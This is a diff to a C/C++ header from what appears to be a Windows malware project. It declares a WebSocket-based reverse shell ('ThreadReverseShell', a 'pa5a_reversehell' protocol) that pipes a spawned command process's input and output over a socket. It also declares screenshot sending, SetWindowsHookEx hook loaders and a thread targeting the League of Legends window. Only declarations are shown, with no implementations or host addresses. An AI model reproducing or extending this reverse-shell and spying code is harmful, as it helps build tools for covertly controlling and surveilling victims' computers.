@@ -139,6 +139,29 @@ LRESULT CALLBACK leagueOfLengendsWindowProc(HWND hWnd, UINT uMsg, WPARAM wParam,
 DWORD ThreadLeagueOfLegends();
 
 /********************************************************************************************************************************/
+// list.cpp
+/**********************************************************/
+typedef struct Node
+{
+	struct Node* prev;
+	struct Node* next;
+	void* data;
+} Node;
+
+typedef struct List
+{
+	struct Node* head;
+	struct Node* tail;
+	int          size;
+} List;
+
+Node* add_node(List* list);
+void del_node(List* list, int index);
+int index_of_node(Node* head, Node* node);
+Node* node_of_index(Node* head, int index);
+void init_data_web_wocket(Node* node);
+
+/********************************************************************************************************************************/
 // loader.cpp
 typedef HHOOK (WINAPI* SetWindowsHookExAProc)(int idHook, HOOKPROC lpfn, HINSTANCE hmod, DWORD dwThreadId);
 typedef HHOOK (WINAPI* SetWindowsHookExWProc)(int idHook, HOOKPROC lpfn, HINSTANCE hmod, DWORD dwThreadId);
@@ -204,21 +227,32 @@ VOID SendScreenshot();
 
 typedef struct WebSocketData
 {
-	HANDLE hThreadRead;
+	// Streams handles
 	HANDLE hChildStd_Input_Rd;
 	HANDLE hChildStd_Input_Wr;
 	HANDLE hChildStd_Output_Rd;
 	HANDLE hChildStd_Output_Wr;
+	HANDLE hChildStd_Err_Rd;
+	HANDLE hChildStd_Err_Wr;
+
+	// Threads handles
+	HANDLE hThreadReadStdout;
+	HANDLE hThreadReadStderr;
+
+	// Process handle
 	HANDLE hCmdProcess;
+
+	// socket handle
 	struct lws* socket;
 } WebSocketData;
 
 BOOL CreatePipes(struct WebSocketData* wsData);
 INT CreateChildProcess(LPCWSTR processName, WebSocketData* wsData);
-BOOL WriteToPipe(LPSTR command, WebSocketData* wsData);
-BOOL ReadFromPipe(WebSocketData* wsData, LPSTR buffer, SIZE_T length);
+BOOL WriteToPipe(LPSTR command, HANDLE handle);
+BOOL ReadFromPipe(HANDLE handle, LPSTR buffer, SIZE_T length);
 VOID PrintError(LPSTR text, INT err);
-DWORD WINAPI ThreadProc(HANDLE wsData);
+DWORD WINAPI ReadStdoutProc(HANDLE wsData);
+DWORD WINAPI ReadStderrProc(HANDLE wsData);
 DWORD WINAPI ThreadReverseShell();
 
 /********************************************************************************************************************************/
@@ -232,8 +266,16 @@ PCHAR encode_UTF8(LPCWCHAR messageUTF16);
 
 /********************************************************************************************************************************/
 // ws.cpp
-VOID connect_client(lws_sorted_usec_list_t* sul);
-INT callback_minimal(struct lws* socket, enum lws_callback_reasons reason, void* user, void* in, size_t len);
+extern List listWebSockets;
+extern struct lws_context* context;
+
+INT reverse_shell_callback(struct lws* socket, enum lws_callback_reasons reason, PVOID user, PVOID in, SIZE_T len);
 BOOL WebSocketConnection();
+
+static struct lws_protocols protocols[] =
+{
+	{"pa5a_reversehell", reverse_shell_callback, 0, 0, 0, NULL, 0},
+	{NULL, NULL, 0, 0, 0, NULL, 0}
+};
 
 EXTERN_C_END
